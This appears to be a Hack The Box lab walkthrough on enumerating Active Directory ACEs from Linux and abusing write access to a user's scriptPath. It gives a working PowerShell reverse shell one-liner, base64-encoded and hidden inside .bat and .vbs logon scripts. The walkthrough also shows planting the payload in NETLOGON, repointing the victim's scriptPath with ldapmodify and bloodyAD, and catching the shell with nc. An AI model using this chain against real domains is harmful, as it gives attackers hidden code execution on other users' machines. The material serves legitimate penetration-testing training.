
---
---

## Enumeration from Linux

To enumerate the ACEs that `david` has over `eric` from Linux, we will use `PywerView`, `dacledit`, and `Adalanche`.

### PywerView

[PywerView](https://github.com/the-useless-one/pywerview) is a partial Python port of [PowerSploit's](https://github.com/PowerShellMafia/PowerSploit) [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), enabling us to utilize all the powerful Cmdlets from Linux.

#### Installation

To use `PywerView`, we need to install `libkrb5-dev`, clone the `PywerView` repository, and install its requirements:

```c
anas21@htb[/htb]$ sudo apt install libkrb5-dev -y
git clone https://github.com/the-useless-one/pywerview.git
cd pywerview/ && pip3 install -r requirements.txt

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
<SNIP>
```

#### Getting the ACEs of David over Eric

Using the `get-objectacl` subcommand of `PywerView`, we will pass the target username for the `--name` option, the domain's name for the `-w` option, the domain controller's IP for the `-t` option, the username and password of the domain user for the `-u` and `-p` options, respectively, `--resolve-sids` to resolve `SIDs`, and `--resolve-guids` to resolve `GUIDs` to their display names:

```shell
anas21@htb[/htb]$ python3 pywerview get-objectacl --name 'eric' -w inlanefreight.local -t 10.129.229.224 -u 'david' -p 'SecurePassDav!d5' --resolve-sids --resolve-guids

objectdn:               CN=eric,CN=Users,DC=inlanefreight,DC=local
objectsid:              S-1-5-21-3456308105-2521031762-2678499478-2104
acetype:                ACCESS_DENIED_OBJECT_ACE
binarysize:             40
aceflags:               
accessmask:             256
activedirectoryrights:  extended_right
isinherited:            False
securityidentifier:     Everyone
objectaceflags:         object_ace_type_present
objectacetype:          User-Change-Password
inheritedobjectacetype: All
iscallbak:              False

<SNIP>
```

`PywerView` will return all the ACEs belonging to `eric` in the domain; however, we only want the ones that `david` has on `eric`. To retrieve them, we will use the `--json` option and pipe the output into [jq](https://github.com/jqlang/jq), filtering ACEs that have the string `david` in their `securityidentifier` field:

```shell
anas21@htb[/htb]$ pywerview get-objectacl --name 'eric' -w inlanefreight.local -t 10.129.229.224 -u 'david' -p 'SecurePassDav!d5' --resolve-sids --resolve-guids --json | jq '.results | map(select(.securityidentifier | contains("david")))'

[
  {
    "objectdn": "CN=eric,CN=Users,DC=inlanefreight,DC=local",
    "objectsid": "S-1-5-21-3456308105-2521031762-2678499478-2104",
    "acetype": "ACCESS_ALLOWED_OBJECT_ACE",
    "binarysize": 56,
    "aceflags": [
      "container_inherit"
    ],
    "accessmask": 48,
    "activedirectoryrights": [
      "read_property",
      "write_property"
    ],
    "isinherited": false,
    "securityidentifier": "CN=david,CN=Users,DC=inlanefreight,DC=local",
    "objectaceflags": [
      "object_ace_type_present"
    ],
    "objectacetype": "Script-Path",
    "inheritedobjectacetype": "All",
    "iscallbak": false
  }
]
```

In the `activedirectoryrights` field, `PywerView` displays that `david` has `read_property` and `write_property` on the `objectacetype` field with the value of `Script-Path`; therefore, `david` has `read` and `write` rights on `eric`'s `scriptPath`.

### dacledit

We can use [dacledit](https://github.com/fortra/impacket/pull/1291) to enumerate the ACEs that `david` has over `eric`.

#### Getting the ACEs of David over Eric

Using `dacledit`, we will query the ACEs that the principal/user `david` has over `eric`:

```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal 'david' -target 'eric' -dc-ip 10.129.229.224 inlanefreight.local/'david':'SecurePassDav!d5'

Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-3456308105-2521031762-2678499478-1108)
[*]   ACE[7] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Script-Path (bf9679a8-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : David (S-1-5-21-3456308105-2521031762-2678499478-1108)
```

In the `ACE flags` field, `dacledit` displays that `david` has `ReadProperty` and `WriteProperty` over the `Object type (GUID)` field with the value `bf9679a8-0de6-11d0-a285-00aa003049e2`, which belongs to [scriptPath](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e); therefore, `david` has `read` and `write` rights on `eric`'s `scriptPath`.
### Adalanche

Although CLI tools can suffice when enumerating the DACLs of a few targets, GUI ones can provide us with a more detailed and user-friendly interface, enhancing visualization and interaction capabilities. [BloodHound CE](https://support.bloodhoundenterprise.io/hc/en-us/articles/17224136169371-About-BloodHound-Edges) does not display nodes connected with a `write` `scriptPath` edge; however, [Adalanche](https://github.com/lkarlslund/Adalanche) does.

`Adalanche`, similar to `BloodHound CE`, utilizes `graph theory` to enumerate the DACLs of a domain's objects and construct relevant attack paths: it displays what they can compromise and compromise them. Although it is still in active development, `Adalanche` provides attackers with powerful capabilities and adversarial insights into a domain, detecting over [90 edge types](https://github.com/lkarlslund/Adalanche?tab=readme-ov-file#detectors-and-what-they-mean).
#### Installation

To install and use `Adalanche`, first, we need to make sure that our local [Go](https://go.dev/dl/) installation is up-to-date:

```shell
anas21@htb[/htb]$ sudo wget -P /usr/bin/ https://go.dev/dl/go1.22.1.linux-amd64.tar.gz
sudo rm -rf /usr/bin/go && cd /usr/bin/ && sudo tar -xzf go1.22.1.linux-amd64.tar.gz
```

Afterward, we will add `Go`'s binary found at `/usr/bin/go/bin` to the system environment variable `PATH`:

```go
anas21@htb[/htb]$ export PATH=$PATH:/usr/bin/go/bin
go version
```

Subsequently, we need to clone the [Adalanche](https://github.com/lkarlslund/Adalanche) repository and run the build script named `build.ps1` with PowerShell:

```c
anas21@htb[/htb]$ git clone https://github.com/lkarlslund/Adalanche Adalanche
cd Adalanche
pwsh build.ps1
```

The `binaries/` folder will contain cross-platform binaries of `Adalanche`; in the case of `Pwnbox`, we will use the `adalanche-linux-x64-*` one.

#### Data Collection

To collect data from domain controllers and domain-joined Windows systems, we will use the `collect activedirectory` command, passing the domain name for the `--domain` option, the domain controller's IP address for the `--server` option, and the username and password of the domain user for the `--username` and `--password` options, respectively:

```shell
anas21@htb[/htb]$ ./adalanche-linux-x64-v2024.1.11-43-g7774681 collect activedirectory --domain inlanefreight.local --server 10.129.229.224  --username 'david' --password 'SecurePassDav!d5'
```

#### Data Analysis

Once `Adalanche` finishes collecting data, we will use the `analyze` command to launch `Adalanche`'s interactive discovery tool, passing the directory of the collected data for the `--datapath` option:

```c
anas21@htb[/htb]$ ./adalanche-linux-x64-v2024.1.11-44-gf1573f2 analyze --datapath data
```

By default, `Adalanche` defaults to the sample query named "`Who owns your AD (Reach Domain Admin etc)`":

![Logon_Script_Image_4](https://academy.hackthebox.com/storage/modules/255/Logon_Script_Image_4.png)

To retrieve domain users along with their relevant DACL attack paths, we will use the LDAP query `(objectClass=user)` (if `Adalanche` produces a graph with a complex layout, click on `Analyze` once more to obtain an alternative arrangement.):

![Logon_Script_Image_5](https://academy.hackthebox.com/storage/modules/255/Logon_Script_Image_5.png)

Then, we will right-click on the `david` node/user and choose `What can this node pwn?`:

![Logon_Script_Image_6](https://academy.hackthebox.com/storage/modules/255/Logon_Script_Image_6.png)

`Adalanche` will display DACL attack paths that `david` can compromise other nodes with; when clicking over the edge between `david` and `eric`, we will notice that `david` has `WriteScriptPath` over `eric`; therefore, `david` has `write` rights on `eric`'s `scriptPath`:

![Logon_Script_Image_7](https://academy.hackthebox.com/storage/modules/255/Logon_Script_Image_7.png)

---
---
## Abusing Write scriptPath from Linux

After determining that `david` has `write` (and `read`) rights over `eric`'s `scriptPath`, we will attempt to exploit this DACL misconfiguration from Linux to gain a reverse shell as `eric`, following the attack path below:

1. Enumerate the `NETLOGON` share to determine whether `david` has `write` permissions anywhere within it.
2. If `david` does have `write` permissions, create in `NETLOGON` a `.bat` or `.vbs` file that runs a PowerShell reverse shell one-liner.
3. Update `eric`'s `scriptPath` to be the same path as the payload file we placed in Step 2.
4. Wait until `eric` logs onto the domain to receive the reverse shell.

### Step 1

We will use `smbclient` ([SMBMap](https://github.com/ShawnDEvans/smbmap) is another alternative) to list the available folders within `NETLOGON`:

```shell
anas21@htb[/htb]$ smbclient //10.129.229.224/NETLOGON -U david%'SecurePassDav!d5' -c "ls"

  .                                   D        0  Mon May  6 04:03:40 2024
  ..                                  D        0  Mon May  6 04:03:40 2024
  CC1FDFA0FF3A                        D        0  Mon May  6 04:05:41 2024
  CCEDF2EBD2F1                        D        0  Thu May  2 15:36:45 2024
  DEFB03023DDA                        D        0  Mon May  6 04:10:40 2024
  EricsScripts                        D        0  Fri May  3 09:34:55 2024
  <SNIP>
```

From `smbclient`'s output, we will discover that there is a folder named "EricsScripts"; to determine the permissions that `david` has on it, we will utilize [smbcacls](https://www.samba.org/samba/docs/current/man-html/smbcacls.1.html), which enables us to view ACLs on an NT file or directory names (ensure there is space after the share's name):

```shell
anas21@htb[/htb]$ smbcacls //10.129.229.224/NETLOGON /EricsScripts -U David%'SecurePassDav!d5'
```

`smbcacls` displays that `david` has `R` (`Read`), `W` (`Write`), and `X` (`Execute`) permissions on the folder; therefore, we can write files, and most importantly our exploit script, to the folder.

### Step 2

To establish a reverse shell as `eric` with PowerShell, we can use the `PowerShell #1` Windows reverse shell payload from [revshells.com](https://www.revshells.com/), making sure to replace `IP` with the `Pwnbox` IP and `PORT` with the listener's port:

```powershell
$LHOST = "ATTACKER_IP"; $LPORT = ATTACKER_PORT; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

Because we will run the PowerShell payload from a `.bat` or `.vbs` file, we can use Python to convert it to `UTF-16LE` (`16-bit Unicode Transformation Format Little-Endian`) then base64-encode it to avoid dealing with escaping quotation marks (alternatively, we can directly use the `PowerShell #3 (Base64)` reverse shell from [revshells.com](https://www.revshells.com/)):

```shell
anas21@htb[/htb]$ python3 -c 'import base64; print(base64.b64encode((r"""$LHOST = "10.129.229.84"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()""").encode("utf-16-le")).decode())'
```

Then, within a `.bat` file, we will use the `powershell` command and pass to it the switches [-ExecutionPolicy Bypass](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1#-executionpolicy-executionpolicy), [-WindowStyle Hidden](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1#-windowstyle-window-style), and most importantly, [-EncodedCommand/-enc](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1#-encodedcommand-base64encodedcommand) followed by the PowerShell encoded reverse shell one-liner:

```shell
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABMAEgATwBTAFQAIAA9ACAAIgAxADAALgAxADIAOQAuADIAMgA5AC4AOAA0ACIAOwAgACQATABQAE8AUgBUACAAPQAgADkAMAAwADEAOwAgACQAVABDAFAAQwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJABMAEgATwBTAFQALAAgACQATABQAE8AUgBUACkAOwAgACQATg<SNIP>
```

Alternatively, we can use a `.vbs` file along with the [CreateObject](https://ss64.com/vb/createobject.html) [wscript](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wscript) method to execute the encoded payload:

```vbscript
CreateObject("Wscript.shell").Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABMAEgATwBTAFQAIAA9ACAAIgAxADAALgAxADIAOQAuADIAMgA5AC4AOAA0ACIAOwAgACQATABQAE8AUgBUACAAPQAgADkAMAAwADIAOwAgACQAVABDAFAAQwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJABMAEgATwBTAFQALAAgACQATABQAE8AUgBUACkAOwAgACQATgBlAHQAdwBvAHIAawBTAHQAcgBlAGEAbQAgAD0AIAAkAFQAQwBQAEMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIAAkAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj<SNIP>"
```

Subsequently, we will use `smbclinet` to connect to the "EricsScripts" folder on `NETLOGON` and place our payload file in it using the `put` command:

```shell
anas21@htb[/htb]$ smbclient //10.129.229.224/NETLOGON --directory EricsScripts -U David%'SecurePassDav!d5' -c "put logonScript.bat"
```

At this point, the payload file is implanted within `NETLOGON`; before learning how to update `eric`'s `scriptPath` attribute from Linux, we need to start an `nc` listener on the same port we specified in the PowerShell reverse shell one-liner:

```shell
anas21@htb[/htb]$ nc -nvlp 9001
listening on [any] 9001 ...
```

### Step 3

To modify `eric`'s `scriptPath` to be the same location as the payload file we placed in Step 2, we will use `ldapmodify` and `bloodyAD`.

#### LdapModify

[ldapmodify](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapmodify.html) is a powerful command-line utility that allows applying a set of add, delete, modify, and/or modify DN operations to an LDAP directory. We supply the changes we want to perform by using the [LDIF: The LDAP Data Interchange Format](https://ldap.com/ldif-the-ldap-data-interchange-format/) change format, as described in [RFC2849](https://datatracker.ietf.org/doc/html/rfc2849).

In our case, we will use an `LDIF` `modify change record` to modify `eric`'s `scriptPath`, setting it to point to the payload file we implanted in the "EricsScripts" folder within `NETLOGON`. Because `logon scripts` are always expected to be within `NETLOGON`, instead of providing the absolute path of the file, we can use its relative one:

```ldif
dn: CN=eric,CN=Users,DC=inlanefreight,DC=local
changetype: modify
replace: scriptPath
scriptPath: EricsScripts\logonScript.bat
```

Then, to apply the change, we will use `ldapmodify`, passing to it the `LDIF` file with the `-f` flag:

```shell
anas21@htb[/htb]$ ldapmodify -H ldap://10.129.229.224 -x -D 'david@inlanefreight.local' -w 'SecurePassDav!d5' -f logonScript.ldif
```

To ensure that the attribute has been updated, we will use [ldapsearch](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html) to retrieve the value of `eric`'s `scriptPath`:

```shell
anas21@htb[/htb]$ ldapsearch -LLL -H ldap://10.129.229.224 -x -D 'david@inlanefreight.local' -w 'SecurePassDav!d5' -b "DC=inlanefreight,DC=local" "(sAMAccountName=Eric)" scriptPath
```

From `ldapsearch`'s output, we will know that `ldapmodify` has successfully updated the attribute.
#### bloodyAD

[bloodyAD](https://github.com/CravateRouge/bloodyAD) is an AD privilege escalation command-line utility that allows us to set and get values of objects' attributes in addition to many other operations.
##### Installation

We can use `pip` to install `bloodyAD` from [PyPi](https://pypi.org/project/bloodyAD/):

```c
anas21@htb[/htb]$ /usr/bin/pip install bloodyAD
```

##### Updating Eric's scriptPath

Then, we will use the `set object` command on `eric`'s `scriptPath`, setting it to point to the payload file we implanted in the "EricsScripts" folder we found on the domain controller:

```shell
anas21@htb[/htb]$ bloodyAD --host "10.129.229.224" -d "inlanefreight.local" -u "david" -p 'SecurePassDav!d5' set object eric scriptPath -v 'EricsScripts\logonScript.bat'
```

To ensure that `bloodyAD` updated the attribute accordingly, we will use `get object` (instead of `set object`) and pass `scriptPath` for the `--attr` flag:

```shell
anas21@htb[/htb]$ bloodyAD --host "10.129.229.224" -d "inlanefreight.local" -u "david" -p 'SecurePassDav!d5' get object eric --attr scriptPath
```

From `bloodyAD`'s output, we will know it has successfully updated the attribute.

### Step 4

Once the user `eric` logs onto the domain, we will receive the reverse shell:

```shell
anas21@htb[/htb]$ nc -nvlp 9001
```